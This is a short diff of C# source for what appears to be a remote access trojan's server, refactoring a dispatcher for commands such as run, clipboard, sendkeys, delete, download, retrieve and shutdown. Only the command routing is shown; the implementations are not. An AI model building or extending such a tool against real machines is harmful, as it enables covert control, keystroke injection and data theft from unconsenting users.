@@ -63,56 +63,40 @@ namespace RATServer
                     switch (c.CMD)
                     {
                         case "message":
-                            Functions.Message(c.Args[0]);
-                            r.Type = "Message"; 
-                            r.Msg = "Message Success";
+                            r = Functions.Message(c.Args[0]);
                             break;
                         case "run":
-                            Functions.Run(c.Args[0]);
-                            r.Type = "Message";
-                            r.Msg = "Run Success";
+                            r = Functions.Run(c.Args[0]);
                             break;
                         case "info":                       
-                            r.Type = "Message";
-                            r.Msg = Functions.PCInfo();
+                            r = Functions.PCInfo();
                             break;
                         case "processes":
-                            r.Type = "Message";
-                            r.Msg = Functions.Processes();
+                            r = Functions.Processes();
                             break;
                         case "delete":
-                            r.Type = "Message";
-                            r.Msg = Functions.Delete(c.Args[0]);
+                            r = Functions.Delete(c.Args[0]);
                             break;
                         case "download":
-                            Functions.Download(c.Args[0], c.Args[1]);
-                            r.Type = "Message";
-                            r.Msg = "Download Success";
+                            r = Functions.Download(c.Args[0], c.Args[1]);
                             break;
                         case "shutdown":
-                            Functions.ShutDown();
-                            r.Type = "Message";
-                            r.Msg = "Shutdown Success";
+                            r = Functions.ShutDown();
                             break;
                         case "clipboard":
-                            r.Type = "Message";
-                            r.Msg = Functions.ClipBoard();
+                            r = Functions.ClipBoard();
                             break;
                         case "sendkeys":
-                            Functions.KeyPress(c.Args[0]);
-                            r.Type = "Message";
-                            r.Msg = "SendKeys Success";
+                            r = Functions.KeyPress(c.Args[0]);
                             break;
                         case "services":
-                            r.Type = "Message";
-                            r.Msg = Functions.Services();
+                            r = Functions.Services();
                             break;
                         case "retrieve":
                             r = Functions.Retrieve(c.Args[0]);
                             break;
                         case "search":
-                            r.Type = "Message";
-                            r.Msg = Functions.Search(c.Args[0]);
+                            r = Functions.Search(c.Args[0]);
                             break;
                         default:
                             break;
